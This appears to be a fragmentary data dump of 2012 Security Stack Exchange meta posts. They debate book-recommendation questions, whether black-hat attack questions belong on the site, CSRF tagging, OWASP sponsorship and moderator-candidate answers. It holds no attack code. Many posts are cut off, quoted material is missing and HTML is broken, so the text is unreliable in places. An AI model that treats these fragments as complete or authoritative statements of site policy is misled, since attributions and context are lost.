  <p>I don't mind. I'm already ""a scapegoat of questionable gender"" here. May as well add S&amp;M to that.   </p>

893,2,2012-08-09T12:20:10.183,3,,"<p>Summary: <strong>don't ask for one book, ask for a curriculum</strong>.</p>

<p>Big-list questions don't work well on Stack Exchange. This is not immediately obvious; at first sight you might think that with one item per answer, the best items get upvoted and come out on top, and all is well. In other words, you have a poll. In fact, this never¹ works, for several reasons.</p>

<ol>
<li>The main trend in votes is that whoever gets in first gets the most votes. A lot of voters only see the thread once, so they won't see later additions.</li>
<li>The secondary trend is that most popular items get the most votes. This may look good, but it isn't. Items get upvotes based on their general popularity — “hey, I've heard of this” (if we're lucky, “hey, I know this, it's good”). Whether the item is actually suitable for the question is rarely a consideration.</li>
<li>The one-item-per-answer tends to attract a lot of “read this” answers that don't bother to say why. Sure, someone can come later and edit a reason into the post. But that rarely happens, so we end up with lots of items with no clue of why we should pursue them.</li>
<li>Often there isn't a One Single item that answers the question. Let's say your opinion is “as a tutorial, get book A and book B (they're equally good, so pick whichever you find first); and also get book C, because it the reference on the topic (but it's hard on beginners)”. You can't express this in the one-item-per-answer format.</li>
</ol>

<p>Insisting that answers provide a complete recommendation mostly solves these problems. That is, if you recommend A and B in an answer, it should also be an assertion that A+B is sufficient for the question, that you don't need anything else.</p>

<ol>
<li>Whoever gets in first still tends to get the most votes. But that's not so much of a problem, because each answer makes a whole. There is value in having each answer individually, not just as part of a poll.</li>
<li>Popular items still get more votes, but this is mitigated by having answers that tend to mix popular and less-popular items. The same popular item may be mentioned by several answers, and they'll be on equal terms.</li>
<li>When answerers are encouraged to make a complete answer, they tend to provide a description of each item: “get A because … and B because … and C because …”. Answers can't be judged solely on the quality or popularity of the recommended item, the description and justification given in the answer also comes into play.</li>
<li>Answerers are free to make their selection however they like, with no artificial constraint.</li>
</ol>

<p>There are guidelines on this topic in the <a href=""https://security.stackexchange.com/faq#dontask"">FAQ</a>. In particular, going for a curriculum rather than a book is a big step towards meeeting the <a href=""http://blog.stackoverflow.com/2010/09/good-subjective-bad-subjective/"">six guidelines on good subjective questions</a> apply here:</p>

<p>    1. <em>Great subjective questions inspire answers that explain “why” and “how”.</em> See point 3 above.<br>
    2. <em>Great subjective questions tend to have long, not short, answers.</em> Not one item, but a complete selection.<br>
    3. <em>Great subjective questions have a constructive, fair, and impartial tone.</em> Because you aren't advertising for a book, you're providing a reading list.<br>
    4. <em>Great subjective questions invite sharing experiences over opinions.</em> Surely you've read more than one book in your life, so draw on your experience, don't just take mention one thing you liked.<br>
    5. <em>Great subjective questions insist that opinion be backed up with facts and references.</em> See point 3 above.<br>
    6. <em>Great subjective questions are more than just mindless social fun.</em> A reading list calls for expertise, it's not something you can throw up in 30 seconds.  </p>

<hr>

<p>Now how does this work in practice? The now-defunct Literature Stack Exchange site tried allowing book recommendation questions with some guidelines that included an exhortation against single-item answers. The book recommendation questions weren't a great success, but some of them did work well. The ones that worked had some characteristics in common:</p>

<ul>
<li>Multiple answers provided a selection of several books with a paragraph or so explaining why each book was included in the list. Often the good answers would not be structured as a straight list, but had at least an introduction showing the philosophy behind the selection.</li>
<li>Answers that didn't play ball were not upvoted (even if they happened to mention a popular book), or even downvoted or even deleted.</li>
</ul>

<p>Making book recommendations work requires that enough of the community plays along, by upvoting the complete answers and downvoting the answers with a too small selection or with no justifications. It would help to have official guidelines allowing moderators to delete bad answers regardless of their score.</p>

<p><strong>Background:</strong>  Prior to being renamed to ""Primarily Opinion-Based"" (and, before that, ""Not Constructive""), the close option that described questions which would likely receive answers ""almost entirely based on opinions, rather than facts, references, or specific expertise"" was called ""Subjective and Argumentative"".

<p>One day, someone (deliberately or accidentally) mis-typed this as ""S&amp;M"".

(Sadism is the enjoyment of causing pain, while Masochism is the enjoyment of receiving pain.) Since ""S&amp;A"" and ""S&amp;M"" are both ""culturally deviant"" in their respective subjects, or (more likely) perhaps just because the typo itself is fairly amusing, the association stuck.</p>

</blockquote>

<p>I don't think this reflects our stance on black hat topics very well. The assertion that “This site is not intended to be a resource for Black Hats” seems to be saying that any discussion of black hat <em>topics</em> (attacks, exploits, etc.) is forbidden. Furthermore, while the text actually doesn't say so, it looks like all questions of attack tools or mechanisms to spread viruses are forbidden.</p>

Quoting from some of the answers with high upvotes on these threads:</p>

</ul>

<p>We should clarify the FAQ to make it clear that discussions of attacks and exploits is on-topic on this site. We should replace the paragraph quoted above by one that reflects the policies that are effectively applied and the kind of bad content that we want to feel justified in removing.</p>

I would appreciate input from moderators regarding past questions that have been deleted for some black hat-related reason and that were not close-worthy under the general Stack Exchange rules.</p>

<p>There, I have said it, now the explanations: what ""we"" want is a serious site with a lot of information and analysis and conceptual stuff; we want to be looked at as a <em>reference</em>. The place to be for the professionals. The meeting place of the higher spirits in the field. What we do <strong>not</strong> want is to meet villains, especially the low grade ones. Consider the following analogy: if this site was about history of crime and police technics, we would like users like forensics experts at Scotland Yard, and certainly not Jack the Ripper -- even though Jack's expertise would be right on spot and he would certainly have very interesting things to say. It is a matter of image and reputation. We want to attract the ""right sort of people"".</p>

<p>However, in this world and century, it is considered bad form to select people. Freedom of speech, equality of rights and dignity, haro on prejudice, name your post-70s fantasy here. Users are supposed to be faceless, and we, as civilized people, are socially expected to judge posts based on their objective technical merits only. So, no question of excluding users; we only talk about questions and answers.</p>

<p>This leads us to the usual debate on whether black hat questions are on topic or not. It misses the point, but at least we feel <em>allowed</em> to discuss scope. All the discussions on the darkness of hats turn into byzantine arguments about how a question about virus propagation can be legit and great some times, and totally forbidden in other circumstances. The one thing which makes the difference is whether the <em>asker</em> is someone we want to be associated with, or someone we would prefer never to meet.</p>

After all a blackhat might ask a question where we all learn somthing, ** <strong>gasp</strong> **...</p>

<p>CSRF is the standard, most widely used name.  Once upon a time, people used to sometimes use XSRF as an alternate name for the attack, but these days I don't see anyone using the name ""XSRF"" any longer.  And, we don't currently have any questions that are tagged XSRF.</p>

Don't introduce a synonym for XSRF; there doesn't seem to be any need for it.  Don't introduce a tag for XSRF.  If anyone happens to tag their question with XSRF (which hasn't happened yet to date, as far as I can tell), edit the question to replace XSRF with CSRF.</p>

In the case of the answer I wrote, I think that we're relatively safe since the demonstrated exploit was on a fictional piece of code.</p>

<p>However, we're bound to get situations in future where people ask about specific vulnerabilities. Should we give them full answers, with near-tutorial levels of detail, or should we provide more vague information that fits most scenarios?</p>

<p>Here's my thoughts so far:</p>

<li>Single-vulnerability questions should be closed as Too Localized, unless they're high profile and warrant a decent writeup on the subject.</li>
<li>Knowledge is inherently amoral. What's done with it is outside our jurisdiction. However, in cases where malintent is shown, we should close the question.</li>

<p><a href=""https://security.stackexchange.com/questions/15436/understanding-a-vulnerability"">Understanding a vulnerability</a></p>

<p>This is my first question on Sec.SE. I was searching high and low for information on this particular vulnerability in the CVD and other similar databases. However, what I could find was either too vague, or too in-depth for someone of my experience.</p>

<p>I asked the question here and learnt plenty from the answer provided. The answerer was you no less. ;) This was what prompted me to stick around.</p>

<p>Going by your guidelines, I would have closed that question. Although it is a chrome vulnerability, it isn't particularly high profile. I don't think that is a good idea.</p>

<p>What we can do is enforce naming guidelines on the questions, which will provide the CVE number and other minor details. This would make searching for a information on a particular vulnerability easier.</p>

<blockquote>
  <p>Knowledge is inherently amoral. What's done with it is outside our jurisdiction. However, in cases where malintent is shown, we should close the question.</p>
</blockquote>

<p>I agree with this. Questions asking for explanations or clarifications about a particular vulnerability should be allowed. However, questions like ""give me the exploit code for this vulnerability pl0x"" should be closed immediately. </p>

<p>I don't think it is possible to provide a guideline for this. It will vary from question to question. The answerer should decide on what to cover. Upvotes and downvotes by the community will do the rest.</p>

925,2,2012-08-21T20:29:27.073,5,,"<p>It's not hard to come up with a real question that's not too localized, that is clearly only for black hat purposes and in my opinion should get deleted.  For example:</p>

<blockquote>
  <p><strong>How do I do an ARP Spoofing Attack</strong>: I'm trying to steal my neighbors passwords/credit card numbers.  I set up a fake version of a popular shopping website and I can connect on their open wifi network.  I think I could do something like ARP spoofing or something to redirect them to my fake site.  It would be very appreciated if someone could give me a clear tutorial on how to carry out these attacks or suggest tools or other attacks that will do this for me.</p>
</blockquote>

<p>Compare to a similar, but perfectly valid question on the same topic:</p>

<blockquote>
  <p><strong>What is the threat from ARP Spoofing:</strong>  How are the attacks done and what can I do to safeguard myself from them?"" </p>
</blockquote>

<p>I would expect stupid answers to the first question posting links to kiddie hacker scripts with little to no explanation of what's going on so being of no use to white hats, but being immediately useful to kiddie black hats.  I wouldn't expect answers to the second question to be such low quality.  Instead, I'd expect them to explain the threat (what is ARP, how does level-2 routing work) and ways to prevent it (e.g., secure the wifi network, use https and other secure protocols). </p>

<p>The difference is subtle, but I believe quite important.  We shouldn't deliberately assist black hats or people doing blind penetration tests (that cannot be in any way differentiated from black hats).  Personally, I would like something to that effect to be present in the rules; otherwise we run the risk of doing <a href=""http://stackexchange.com/legal/content-policy"">illegal things</a> in some jurisdictions, though I am not a lawyer.  (Does suggesting ways for someone to do a successful SQL injection attack on a specific application count as abetting a criminal?)</p>

<p>You should not ask questions asking for assistance in doing illegal activities like breaking into a system you do not have permission to use, or searching for exploits in an web application that you did not write and do not have the source code for and we have no way of knowing if the web application's owners have given you permission to legally evaluate its security.  However, it is encouraged to ask and answer generic questions about various types of attacks, essentially in the context of how do the attacks work and how to best prevent them from occurring on your systems.  A general guideline of questions and answers should be whether this question could be useful to a white hat (e.g., not automated kiddie hacking scripts), but a description of weaknesses in certain weak methods and how they should be fixed.</p>

<hr>

<p>Long edit in response to Gilles:</p>

<p>My claim is that ""too localized"" and ""not a real question"" will not capture all black hat questions.  NaRQ can usually be avoided with clear language focused a specific aspect of an attack.  Localization can be avoided by asking about an attack relevant to many computers/situations.  (And in any case many too localized attacks are less localized than highly-upvoted questions like <a href=""https://security.stackexchange.com/questions/5701/i-just-discovered-major-security-flaws-in-my-web-store"">""I just discovered major security flaws in my web store""</a> ).  </p>

<p>I have no problem erring on the side of explaining principles behind an attack to increase the knowledge for defensive measures.   Yes, resources on the internet exist for black hats with tools and tutorials, but we don't have to be one of them (asking specific questions could be quite useful to script kiddies even if the knowledge exists elsewhere). </p>

<p>I don't think my belief is unique: let's look at other parts of the four of the five quotes you gave (Graham Lee's answer did want to allow any question asking about how to build malware without regard to intention):</p>

<ul>
<li><p><a href=""https://security.meta.stackexchange.com/a/130/2568"">rox0r - 'why risk losing legitimate users/conent'</a> ""Asking for exploits against a specific person (company) are banned"" while ""illustrating auth attacks and weakness should be discussed.

<li><p><a href=""https://security.meta.stackexchange.com/a/294/2568"">Avid - 'It's ... valid ... to be asking about the attack, exploit ...' </a> At some point, we need to rely on human sense - our collective noses for what is hinky"".  <a href=""https://security.meta.stackexchange.com/questions/14/should-we-accept-question-about-making-exploit-or-building-malware#comment12_15"">Elsewhere Avid said</a>:  [We should be] 'explaining principles, so as to better protect against [malware/exploits] rather than providing food for script kiddies.'</p></li>
<li><p><a href=""https://security.meta.stackexchange.com/a/297/2568"">ninefingers - 'There is ... only shades of gray'</a> ""its a subjective call"".  ""Pretty much the same question, but looks totally different in terms of intent. If I were to draw the line in the sand, I would say the key in my version would be that you're coming at it from a defence angle too.""</p></li>
</ul>

<p>These all seem to agree that intent is important; and the belief that black hat useful only questions/answers should be against our policies.  </p>

<p>This is not an academic issue that only exists for trick questions.  There have been mod-removed questions that specifically asked how do I do some black hat activity (e.g., <a href=""https://security.stackexchange.com/questions/1444/windows-7-exploited-remotely"">how to exploit windows 7 remotely</a> ) that were not too localized and easily could have been phrased as a real question.</p>

<p>Another example is <a href=""https://security.stackexchange.com/revisions/13997acf-e211-471b-9674-486b0e6500a5/view-source"">""How can I check whether it's SQL injection?  How can I exploit it?  I don't have access to the source code but can query it with more requests.""</a>.  I think questions like that (part of an attack or blackbox pen test) should be deleted, not edited into something <a href=""https://security.stackexchange.com/questions/18663/how-to-make-sql-injection-in-postgresqls-tsquery"">resembling a legitimate question</a>.  I have no problem with a quite similar question (possibly from a gray/white box pen test) saying ""the PHP source code executing the SQL query says <code>pg_query_params($dbconn, 'SELECT * from text_table where plainto_tsquery($1) ', array($user_input);</code> and gives error messages like ... is this vulnerable to SQL injection?"".  This is perfectly fine as it will be useful to know if you have to fix your weak source code (despite being more localized).  Note, the original version of the question had mod-removed answers that basically said ""try running this set of SQL injection kiddie scripts"".</p>

<p>How about something along the lines of</p>

927,1,2012-08-22T19:43:29.850,9,177,"<p>Following up on <a href=""https://security.meta.stackexchange.com/q/827/33"">Should we sponsor OWASP again?</a>, I'd like to request SEI to renew their corporate sponsorship of <a href=""https://www.owasp.org/index.php/Main_Page"" rel=""nofollow noreferrer"">OWASP</a>.   </p>

<p>From <a href=""https://www.owasp.org/index.php/Main_Page"" rel=""nofollow noreferrer"">OWASP.org</a>:</p>

<blockquote>
  <p>The Open Web Application Security Project (OWASP) is a 501c3 not-for-profit worldwide charitable organization focused on improving the security of application software. Our mission is to make application security visible, so that people and organizations can make informed decisions about true application security risks.</p>
</blockquote>

<p>(Note that OWASP is a <a href=""https://www.owasp.org/index.php/Membership"" rel=""nofollow noreferrer"">501c3 not-for-profit</a>.... )</p>

<p>To recap from <a href=""https://security.meta.stackexchange.com/q/374/33"">last year's sponsorship request</a>: </p>

<blockquote>
  <p>With all the good that SEI is doing, and sponsoring several open source projects to further their goal of making the Internet smarter, I think OWASP would be a great partner to that goal.   </p>
</blockquote>

<p>And from <a href=""https://security.meta.stackexchange.com/a/828/33"">@RoryAlsop's answer</a> on the other re-sponsor post: </p>

<blockquote>
  <p>They are an independent, not for profit organisation which aims to provide free tools for all web developers to help secure their code, applications and environments and this benefits us all.</p>
  
  <p>They are high profile, and the <a href=""https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project"" rel=""nofollow noreferrer"">OWASP Top Ten</a> has been accepted by most of the Fortune 500 as the de facto minimum requirements for securing their externally facing web sites. In addition <a href=""https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API"" rel=""nofollow noreferrer"">ESAPI, the Enterprise Security API</a> makes it easier for coders to write lower risk applications by providing a security control library.</p>
  
  <p>Good recipient of sponsorship, I say - wide audience, deserving cause, high profile, will benefit SE's members directly.</p>
</blockquote>

<p>Specifically, I am talking about being a <a href=""https://www.owasp.org/index.php/Corporate_Member"" rel=""nofollow noreferrer"">corporate sponsor</a> for the global OWASP organization.   </p>

<p>As part of the sponsorship, 40% of the funds can be allocated to specific chapters or projects, as was discussed last year at <a href=""https://security.meta.stackexchange.com/q/516/33"">Which OWASP Project should SEI support?</a>.    </p>

<p>I would most prefer sponsorship of the Israel conference again (if it is possible to arrange this in time, though this is doubtful), as I am on the IL chapter board and responsible for the conference: </p>

<blockquote>
  <p>Specifically, this conference (unlike most of the other AppSec conferences) is completely free to attend, and is totally covered by sponsorships. We are expecting several hundred to attend. </p>
</blockquote>

<p>In addition, the consensus last year was to allocate an additional 20% to <a href=""https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API"" rel=""nofollow noreferrer"">ESAPI</a>, as this project is a software package used by a very large number of developers worldwide. </p>

<p>If you agree with the sponsorship, but think the allocation would be better for a different project, please add that here. </p>

928,2,2012-08-22T23:50:39.480,8,,"<p>After several discussions in chat, most notably ones involving @Gilles, I've learned a couple key points.  To sum up, these add up to say that any truly undesirable or inappropriate ""black hat"" questions should already be getting handled per existing StackExchange policies.</p>

<p><strong>For the TL;DR version, jump to the bolded paragraph at the end.</strong></p>

<ul>
<li>Any post that appears deliberately aimed at facilitating malicious and/or illegal activity runs afoul of the StackExchange <a href=""http://stackexchange.com/legal/terms-of-service"">Terms of Service</a>.  Particularly, these pieces of Section 4, ""Restrictions"" (emphasis mine):</li>
</ul>

<blockquote>
  <p>... <strong><em>Any fraudulent, abusive, or
  otherwise illegal activity</em></strong> or any use of the Services or Content in
  violation of this Agreement <strong><em>may be grounds for termination of
  Subscriber’s right to Services or to access the Network</em></strong>. </p>
</blockquote>

<p>...</p>

<blockquote>
  <p><em><strong>Use of the Network or Services to violate the security of any computer network, crack passwords or security encryption codes,</em></strong>
  transfer or store illegal material including that are deemed
  threatening or obscene, <strong><em>or engage in any kind of illegal activity
  is expressly prohibited.</em></strong> ...</p>
</blockquote>

<ul>
<li>Most (if not all) other undesirable or inappropriate ""black hat"" questions should already be getting closed per the regular close reasons.  Particularly:  <strong>Not Constructive</strong>, <strong>Not a Real Question</strong>, or <strong>Too Localized</strong>.  Off-Topic should not be used, because ""black hat"" in general is <em>not</em> off-topic.</li>
</ul>

<p>So, for the purposes of <em>setting</em> policy, nothing really needs to be added to the FAQ - in fact, the existing section could be removed and our policy would still be the same.  However, for the sake of emphasizing our position against the <em>knowing</em> facilitation of illegal conduct, there <em>should</em> be something in the FAQ to re-iterate or paraphrase the relevant portions in the ToS.  Perhaps the existing section could use a thorough re-write, but it should not be done without.</p>

<p>Throughout all these discussions, I came to form an analogy of our community's situation to that of a responsible gun store owner who is operating in a jurisdiction that protects the right to keep and bear arms.</p>

<p><strong>As responsible citizens who are in the business of ""selling weapons"", we should happily ""sell"" our ""weapons"" to anyone - regardless of their intent - up until the point that we actually have a reasonable suspicion (or, and especially, confession) that their intent is malicious and/or illegal. After that point, and <em>only</em> after that point, it is our ethical responsibility to refuse the ""sale"".</strong></p>

When that little diamond appears beside a name people tend to notice a little more, to take the comments with a little more weight. It gives better opportunity to help shape the discussion, or to stop disagreements before they can spiral out of control.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/b379cfe07bbf58aab9414128a6e159f8?s=16&amp;d=identicon&amp;r=PG"" alt=""M&#39;vy""> <a href=""http://chat.stackexchange.com/users/13100/mvy"">M'vy</a> <a href=""http://chat.stackexchange.com/transcript/message/5887039#5887039"">answered</a>:</strong>  there is many obvious cases that does not require to reach the consensus of 5 vote to close (for example).

This would be especially helpful when asking people to stop going off track in comments or take things to chat. On another note, 10k and 20k rep would take new members like me a VERY long time to reach even with active participation in the community.</p>

From the outside looking in - I respect the high rep users for being able to answer questions well and having a depth of expertise - but I look to the moderators for examples and insights on the rules of fair play.</p>

Also, for many of us, we could help cover diamond-level tasks (speedy closure/deletion of egregiously offending posts, moderation of problem users, etc.) during times when the current team is generally asleep or otherwise preoccupied.</p>

However, it's important not to let poor questions by tirades of new users pollute the site, so it's important to enforce that changes are made to make the questions good.</p>

I'll even fight for a change in attitude on the ""don't cares"" - up to the point where someone clearly tells me they don't want my help.  Then I have to judge if they are a trivial annoyance or actually causing enough harm to need removal.  Also I think each new user is a living test of our guidance - and see misguided folks as a perfect opportunity to improve our resources.</p>

I think the important thing to remember, as a mod, is that the community is more of a priority than janitorial work. If someone has a problem, I'd invite them to chat, and if a reasonable solution can't be found quickly, the situation should be documented on meta so that the rest of the community can weigh in.</p>

It's a balancing act, because I can't take responsibility for another user's misguided view point - so at some point I'd have to figure out a way to say ""join the club or leave the clubhouse"", but not until after some dedicated discussions, assuming the person wants to have them.</p>

However, that's not to say that we've got a lack. The feedback there is important, and gives us a great way to sense public opinion on topics. After all, the site is for the community, so at least a good part of the decision making should be given to the community.</p>

I think the discussions on meta should <em>definitely</em> guide decisions. I really see the moderator's role as that of final arbiter and janitor. The discussions on chat and meta should really act as an advising event, then the moderators should make the final decision based on that guidance.</p>

That said, we probably do have a ""representative percentage"".  Although I myself am occasionally guilty of not following Meta closely enough (an issue I plan to rectify within myself in the near future), I've always been of the position that ""Those who care, Meta."".</p>

Meta, chat, questions &amp; comments - they all play a role in giving me some information about what the community and individuals are thinking.  Unless meta involvement was near 100%, I wouldn't really want meta to be the lone voice for the community - it's too much of a self-selecting group.  I'd look first to trends in questions and comments, second to meta, and third to chat - mostly because chat is my own weakest link in the SE  streams.</p>

My one true goal <em>should</em> be to not delete posts, but sometimes it just has to be done.</p>

I'd research the poster's history - in this case, if I really think it's malicious, I'll delete.

The StackExchange network and legal jurisdictions already has rules regarding illegal material, being a partner to committing crimes, etc, etc. I don't think material should be banned because it is ""Offensive Security"", I think material should be off-topic if it meets the off-topic definitions as per the FAQ and/or already disallowed by Terms of Service or the laws governing SEI.</p>

However, where a blackhat question shows clear malicious intent, we should close it. Where <em>any</em> question demonstrates intent to commit illegal activities, we should close it.</p>

I think, at that point, we have to leave it to the moral compasses of answerers.

Knowing the moderators as I do certainly means I have a great window into decisions. <em>I</em> don't feel that the site itself needs to change the way it runs, but that's also not entirely my decision to make.

They should take their discussion to chat. I'd also ask them to be civil. Whilst it's important to be passionate about such topics, it's not constructive to have a flame war.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/6fc641bdddde78a51c0db6b8527c54f7?s=16&amp;d=identicon&amp;r=PG"" alt=""Polynomial""> <a href=""http://chat.stackexchange.com/users/27025/polynomial"">Polynomial</a> <a href=""http://chat.stackexchange.com/transcript/message/5887423#5887423"">continued</a>:</strong>  If they continued to flame each other, they'd both end up warned and suspended. High reputation is not grounds for being above the law. If anything they should be held to higher standards, since they've been around long enough to know what's acceptable.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/b379cfe07bbf58aab9414128a6e159f8?s=16&amp;d=identicon&amp;r=PG"" alt=""M&#39;vy""> <a href=""http://chat.stackexchange.com/users/13100/mvy"">M'vy</a> <a href=""http://chat.stackexchange.com/transcript/message/5887417#5887417"">answered</a>:</strong>  Highly respected members aren't highly respected for nothing. First think is to transfer this from the site to the chat, then discuss the matter. If this is really out of control, then I'd give a warning before using more punitive means.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/481707331ea4d07ae2490bb88ddfd7ca?s=16&amp;d=identicon&amp;r=PG"" alt=""Scott Pack""> <a href=""http://chat.stackexchange.com/users/1516/scott-pack"">Scott Pack</a> <a href=""http://chat.stackexchange.com/transcript/message/5887427#5887427"">answered</a>:</strong>  That's a problem on two fronts. One is that bickering like that <em>should</em> be tamped down so we can keep a civil discourse. The other problem is that if they're respected members, then that also sets a precedent that their behavior is acceptable. I think the first step should be to weigh in and ask them to chill it out. If they don't, or if it escalates then it needs to be something along the lines of ""Take it to a chat."" At which point the offensive material should be removed.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/8f8571493d71202986f2a6ab0dbd7c23?s=16&amp;d=identicon&amp;r=PG"" alt=""Iszi""> <a href=""http://chat.stackexchange.com/users/15/iszi"">Iszi</a> <a href=""http://chat.stackexchange.com/transcript/message/5887533#5887533"">answered</a>:</strong>  Again, this can be very situational.  One thing you don't want to do, is join the heated argument by participating in a public comment war.  Most of the highly respected members of this community, I think,  are also active chat participants.  So, I would probably lean on that as a tool to help resolve the issue in an ""offline"" manner.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/8f8571493d71202986f2a6ab0dbd7c23?s=16&amp;d=identicon&amp;r=PG"" alt=""Iszi""> <a href=""http://chat.stackexchange.com/users/15/iszi"">Iszi</a> <a href=""http://chat.stackexchange.com/transcript/message/5887558#5887558"">continued</a>:</strong>  Unfortunately, if things get too extreme, certain measures have to be taken regardless of who the member is.  Temporary restrictions on posting privileges, or closures/locks on the related threads are not out of the question.  One thing I may have neglected to remember though, is that moderators also have access to e-mail contact - I'd probably like to try that before anything that adversely affects the user's public profile or a (good) question.</p>

I'd aim for a ""take it outside, guys"" approach - trying to get them to duke it out in a way that isn't so public and doesn't derail the community.</p>

I think my time budget should be <em>whatever I can afford</em>, because I love Sec.SE and I enjoy interacting with people with it. That's the motivation I have, so it's not going to change if I become a mod.</p>

Between work and home life I'm much more likely to have 10-15 minutes here than there rather than long stretches of devoted time. Based on conversations I've had with moderators, both here and for other sites, handling the flag queueueueue can be be handled great with that kind of involvement. Typically, I'm available 8am-5pm UTC-4/5, and then off and on after that.</p>

If that grows to be too much, then one of two things need to be considered:  1.) Do I really have enough time in my life to be a moderator.  2.) Should we ask SEI to open up another slot?  My core time period of the day is generally daylight hours, U.S. Eastern, plus some late night hours.</p>

Quite honestly, this is the hardest part for me - I suppose no one has a lot of ""free time"" - I'm hoping to rebalance my time - less time spent answering questions, more spent moderating, and when and how I do the moderation is it's own question.   I suspect the time budget required may be far more than I have available as it grows - there's a point with any community where moderation needs explode.</p>

I'm here to learn stuff, and I'm here to teach stuff. Being a moderator just means an extra level of involvement in that stuff. I like to see the community thrive, and I love seeing new people become interested in security. I think any decrease in rep gain would be more than made up for by having the privilege being a mod gives.</p>

Not sure I agree!  The Security questions are among the toughest I've answered across the SE sites. :)  Yes, it's an ego hit - but it's seemed to me that once I ended up on the first page of users, the warm glow of gaining rep dimmed in comparison to the opportunity to guide a community.  I'm banking on the fact that as with other forums, the warm feeling of a growing community that is ""mine"" will replace rep as my point of satisfaction.</p>

I think a major reason some people rush to certain rep levels is because certain privileges are tied to them, and those privileges greatly facilitate our ability to help make (and keep) this community a better place.  Having all those powers come with the blue diamond removes the <em>need</em> to accumulate rep.</p>

There are far more users now than when I started. IF the questions are getting good answers from somebody, I don't need to duplicate that effort. My rep is big enough that I no longer care about my rep... I care about my role, developing the community, and helping us grow constructively. Sometimes that's in answering, and sometimes that's in other things.</p>

The other half is acting as a representative of the community. Sure, I can go to a conference and tell people that I'm a community member, but it doesn't carry nearly the same weight as saying one moderates.

I think you've effectively listed most of the things that are exclusively restricted to moderators.  Then again, I don't have access to moderator tools to know what other sorts of useful functions or information comes with them.

The Venn diagram of usefulness for Site/Meta/Chat do have some overlap, but they're all very important parts of the whole. I think meta.stackexchange is one that I'll have to get more involved in. While we are a site of our own right, it is where broad sweeping changes and discussions get made. The mods <em>should</em> know what's going on everywhere, so that we can frame those changes to what matters here.</p>

After that, Meta participation is definitely important, with Chat to supplement it.  The Blog is very important for publicizing our site, but (myself being guilty of this as well) I feel it is largely ignored.  Meta.SO is more of an ""as needed"" thing, I think, for the relatively rare occasion where an issue is not localized to Sec.SE and needs resolution from SEI or a consensus from the wider SE community.</p>

I do tend to use it quite sparingly on here, so I don't think I'd be flying off the handle with closes left right and center. It's important to wait for other people's opinions. So I'd post it in chat, wait for a consensus, then close if necessary. Same goes for questions with a single close flag. It's important for more than one person to give their view.</p>

That probably wouldn't change if I was moderator - I see the site as growing.  I know the option's there, I've used it with restraint - and I'd rather continue to err on the side of caution.</p>

<p>I don't think we need to have a ""minimum expected knowledge"" at all - when it comes to security.<br>
A complete security newbie is welcome to ask introductory level questions about security.  </p>

<p>However, I think it is fair to expect that the asker at least have a basic knowledge about the <em>content</em> of his question, i.e. whatever it is he's asking security <em>about</em>.<br>
If you're asking the most basic of questions on how to secure an Apache webserver - that's fine, <strong>if</strong> you know what an Apache webserver <em>is</em> (and how to configure it).<br>
If you're asking how to prevent SQL Injection in PHP, from the ground up - that's great, <strong>if</strong> you know how to write code in PHP.<br>
If you're asking how to bypass a firewall - <strong>you should probably know</strong> what a firewall <em>is</em> and what it <em>does</em> (though asking about that here is also okay, but that is a completely different question). You should probably have a clue about how networks work, how they're set up, the difference between a network and a workstation, and so forth.   </p>

<p>In other words: we should be willing to educate even kindergarden level - about <em>security</em>. Nothing else.  (And btw, even high-level non-security questions would be offtopic, anyway.) 
Note, however, that sometimes the simplest questions are often answered on Wikipedia, and as always we do expect the asker to do <em>at least</em> a minimal amount of research, before asking. </p>

<p>I think the reason the linked question was closed, was because it was assuming a level of (non-security) knowledge, that was not apparently there. It felt to me that the asker didn't understand network basics, or really what a firewall is and does (and does not do). Or perhaps the question just left a large gap in specificity.<br>
I think that had the asker just came out and said ""WTF is this firewall thing, and what does it do for my network?"" it would have been ontopic, though then answers would probably have been best served by RTFWA (read the Wikipedia article).  </p>

985,2,2012-09-03T23:14:39.290,3,,"<p>I think the biggest problem with the question was not the minimum expected knowledge, but that the question was not sufficiently specific about what was being asked: the question was vague and over-broad and it was hard to tell what exactly the question was.  The comments didn't help derive a narrower focus.</p>

<p>In general, I don't think we need to have much in the way of minimum expected level of knowledge.  As the FAQ says, the IT Security site is intended ""for Information Security professionals to discuss protecting assets from threats and vulnerabilities""; anything that falls within that scope seems like it could be fine.</p>

<p><em>However</em>, that said, I <em>do</em> think it is reasonable to expect people to do a little bit of background research on their own first.  So, if the question is completely answered by Wikipedia or by the first hit on Google, and if the question-asker hasn't tried to read those, then the question is probably too low-quality for us.  So, in that case, I would expect that sort of question might still be closed -- not because of minimum expected level of knowledge, but because of lack of research.  They certainly don't need to do a comprehensive literature survey before asking a question here, but they should probably take some very basic steps on their own first.</p>

<p>In short, here are two necessary (but not sufficient) requirements for a question to be a good one (in my opinion):</p>

<ul>
<li><p>The question must be specific about what is being asked.</p></li>
<li><p>The question-asker should do a little bit of basic research first on their own, before asking.  I don't expect the world, but I do expect a little bit.</p></li>
</ul>

<p>As always, the <a href=""https://security.stackexchange.com/faq"">faq</a> has good advice on how to ask a good question.</p>

<p>Many of the sites are about specific penetration testing concepts and techniques. There are sites devoted to web application hacking, privilege escalation and others. Thus the core questions would be on topic here.</p>

<p>Some of the sites are quite popular. They can help draw traffic to Sec.SE if we provide high quality answers that explains the questions and their solutions in great detail.</p>

<p>This would be a good balance of black hat vs white hack content. All the technique involved would of course be applicable to a malicious user. However, at least such questions would show clearly what the intention of the asker is, which is IMO a good improvement over most of the <em>current</em> ""black hat"" questions which are vague at best.</p>

<p>I don't understand why the fact that SU is likely to close it as a dup would make us shy away from migrating the question to the site where it belongs.  If it is off-topic for us, it is off-topic.  And if the question has already been answered there before, it has already been answered, and there's not really any need to repeat that.</p>

<p><em>If it is on-topic for Security.SE</em>, I would suggest leaving it here, even if there is some overlap with another question on another community.  This community often has a different perspective and provides a different sort of answer.</p>

<p>Example: If asking about conceptually how data recovery works and under what circumstances it might be feasible, then that's the sort of question that our community can probably give great answers to.  If asking for a step-by-step recipe of how to do it, that might be the sort of thing that ServerFault will have better answers for.  So, our judgement about whether it is on-topic or off-topic might depend upon the details of exactly what is being asked.</p>

